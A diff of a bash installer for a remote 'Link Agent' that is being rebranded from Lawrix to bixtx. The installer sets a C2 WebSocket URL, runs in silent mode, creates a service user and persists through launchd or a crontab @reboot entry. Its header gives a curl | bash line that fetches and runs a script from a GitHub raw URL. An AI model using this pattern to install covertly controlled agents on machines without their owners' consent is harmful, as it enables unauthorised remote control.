@@ -1,11 +1,11 @@
 #!/usr/bin/env bash
 # ╔══════════════════════════════════════════════════════════════════════════╗
-# ║  Lawrix AI Link Agent — Hardened Linux/macOS Installer  v4.7.2          ║
-# ║  Run: curl -sSL https://get.lawrix.ai | bash -s -- --key KEY [opts]     ║
+# ║  bixtx Link Agent — Hardened Linux/macOS Installer  v4.7.2          ║
+# ║  # " Run: curl -sSL https://raw.githubusercontent.com/jonan2002/BIXTX/main/software-a/install.sh | bash -s -- --key KEY [opts]"    ║
 # ║  Options:                                                                ║
 # ║    --key  KEY        Enroll key (required)                               ║
-# ║    --c2   WSS_URL    C2 WebSocket URL (default: wss://api.lawrix.ai/ws)  ║
-# ║    --dir  PATH       Install directory  (default: /opt/lawrix-agent)     ║
+# ║    --c2 WSS_URL   C2 WebSocket URL (default: ws://localhost:3001)  ║
+# ║    --dir  PATH       Install directory  (default: /opt/bixtx-agent)     ║
 # ║    --silent          Suppress non-error output                           ║
 # ╚══════════════════════════════════════════════════════════════════════════╝
 
@@ -15,15 +15,15 @@ IFS=$'\n\t'
 
 # ── Constants ─────────────────────────────────────────────────────────────────
 AGENT_VERSION="4.7.2"
-SERVICE_NAME="lawrix-agent"
-SERVICE_LABEL="ai.lawrix.agent"
-AUDIT_LOG="/var/log/lawrix-installer.log"
-AGENT_LOG="/var/log/lawrix-agent.log"
+SERVICE_NAME="bixtx-agent"
+SERVICE_LABEL="com.bixtx.agent"
+AUDIT_LOG="/var/log/bixtx-installer.log"
+AGENT_LOG="/var/log/bixtx-agent.log"
 
 # ── Defaults (overridable via args or env) ────────────────────────────────────
-AGENT_DIR="${AGENT_DIR:-/opt/lawrix-agent}"
-ENROLL_KEY="${LAWRIX_ENROLL_KEY:-}"
-C2_URL="${LAWRIX_C2_URL:-wss://api.lawrix.ai/ws}"
+AGENT_DIR="${AGENT_DIR:-/opt/bixtx-agent}"
+ENROLL_KEY="${BIXTX_ENROLL_KEY:-}"
+C2_URL="${BIXTX_C2_URL:-ws://localhost:3001}"
 SILENT=false
 
 # ── Parse arguments ──────────────────────────────────────────────────────────
@@ -38,9 +38,9 @@ while [[ $# -gt 0 ]]; do
 done
 
 # ── Logging helpers ───────────────────────────────────────────────────────────
-log()  { $SILENT || printf '[LRX] %s\n' "$*"; }
-info() { printf '[LRX] %s\n' "$*"; }
-die()  { printf '[LRX] FATAL: %s\n' "$*" >&2; exit 1; }
+log()  { $SILENT || printf '[BTX] %s\n' "$*"; }
+info() { printf '[BTX] %s\n' "$*"; }
+die()  { printf '[BTX] FATAL: %s\n' "$*" >&2; exit 1; }
 
 # ── Audit trail ───────────────────────────────────────────────────────────────
 # Writes to a tamper-resistant log (append-only if chattr available).
@@ -112,7 +112,7 @@ elif command -v shasum >/dev/null 2>&1; then
 fi
 
 audit "INSTALL_START version=${AGENT_VERSION} platform=${PLATFORM} installer_sha256=${INSTALLER_HASH}"
-log "Lawrix Link Agent v${AGENT_VERSION} — Hardened Installer"
+log "bixtx Link Agent v${AGENT_VERSION} — Hardened Installer"
 log "Platform  : ${PLATFORM}"
 log "Node.js   : v${NODE_MAJOR} (${NODE_BIN})"
 log "Install dir: ${AGENT_DIR}"
@@ -128,7 +128,7 @@ create_service_user() {
         --no-create-home \
         --home-dir "$AGENT_DIR" \
         --shell /usr/sbin/nologin \
-        --comment "Lawrix Agent Service" \
+        --comment "bixtx Agent Service" \
         "$SERVICE_NAME" 2>/dev/null \
         || useradd --system --no-create-home --shell /bin/false "$SERVICE_NAME"
       audit "USER_CREATED user=${SERVICE_NAME}"
@@ -142,7 +142,7 @@ create_service_user() {
       done
       dscl . -create "/Users/${SERVICE_NAME}"
       dscl . -create "/Users/${SERVICE_NAME}" UserShell    /usr/bin/false
-      dscl . -create "/Users/${SERVICE_NAME}" RealName     "Lawrix Agent"
+      dscl . -create "/Users/${SERVICE_NAME}" RealName     "bixtx Agent"
       dscl . -create "/Users/${SERVICE_NAME}" UniqueID     "$uid"
       dscl . -create "/Users/${SERVICE_NAME}" PrimaryGroupID 1
       dscl . -create "/Users/${SERVICE_NAME}" NFSHomeDirectory /var/empty
@@ -217,8 +217,8 @@ sed \
   -e "s|__C2_URL__|${SAFE_C2}|g" \
   -e "s|__ENROLL_KEY__|${SAFE_KEY}|g" \
   > "$ENV_TMP" <<'ENVEOF'
-LAWRIX_SERVER_URL=__C2_URL__
-LAWRIX_ENROLL_KEY=__ENROLL_KEY__
+BIXTX_SERVER_URL=__C2_URL__
+BIXTX_ENROLL_KEY=__ENROLL_KEY__
 NODE_ENV=production
 SILENT_MODE=true
 LOG_LEVEL=warn
@@ -408,7 +408,7 @@ PLISTEOF
 # ────────────────────────────────────────────────────────
 else
   log "Falling back to crontab @reboot persistence..."
-  MARKER="# lawrix-agent-entry"
+  MARKER="# bixtx-agent-entry"
   CRON_LINE="@reboot ${NODE_BIN} ${AGENT_DIR}/src/index.js >> ${AGENT_LOG} 2>&1  ${MARKER}"
   # Remove any existing entry (idempotent) then append fresh
   (
@@ -466,7 +466,8 @@ audit "INSTALL_SUCCESS payload_sha256=${PAYLOAD_HASH} service_healthy=true"
 # Disable the rollback trap now that we have a confirmed healthy install
 trap - EXIT ERR
 
-info "✓ Lawrix Agent v${AGENT_VERSION} installed and verified healthy."
+info "✓ bixtx Agent v${AGENT_VERSION} installed and verified healthy."
 info "  Log   : ${AGENT_LOG}"
 info "  Audit : ${AUDIT_LOG}"
 info "  Device will appear in dashboard within 30–60 seconds."
+
